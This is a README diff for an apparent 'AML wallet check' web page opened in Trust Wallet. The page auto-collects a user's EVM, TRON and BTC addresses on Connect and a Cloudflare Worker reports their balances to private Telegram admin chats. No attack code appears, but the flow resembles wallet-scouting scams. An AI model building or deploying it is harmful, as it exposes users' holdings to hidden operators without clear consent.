@@ -2,7 +2,40 @@
 
 Static frontend for GitHub Pages plus Node/SQLite backend and a private Telegram admin bot for Render or Railway.
 
-## Backend deploy
+## Автопроверка без Render (рекомендуется)
+
+Страница `check.html` работает **без Node backend**. Trust Wallet автоматически передаёт адреса EVM / TRON / BTC, а лёгкий **Cloudflare Worker** проверяет балансы и шлёт уведомление в Telegram.
+
+### 1. Деплой Worker
+
+См. [worker/README.md](worker/README.md):
+
+```bash
+cd worker
+wrangler login
+wrangler secret put TELEGRAM_BOT_TOKEN
+wrangler secret put TELEGRAM_ADMIN_CHAT_IDS
+wrangler deploy
+```
+
+### 2. Подключите frontend
+
+В `config.js`:
+
+```js
+window.AML_SCAN_URL = "https://aml-wallet-scan.<your-account>.workers.dev";
+window.AML_API_BASE = "";
+```
+
+### Как это работает для пользователя
+
+1. Открывает `check.html` в Trust Wallet (deeplink или Telegram Web App).
+2. Нажимает **Connect** — адреса подставляются автоматически, без ручного ввода TRON.
+3. Worker проверяет EVM, TRX, BTC, USDT и отправляет сводку админам в Telegram.
+
+---
+
+## Backend deploy (опционально, legacy)
 
 1. Deploy this repository as a Node web service.
 2. Use `npm install` as build command.
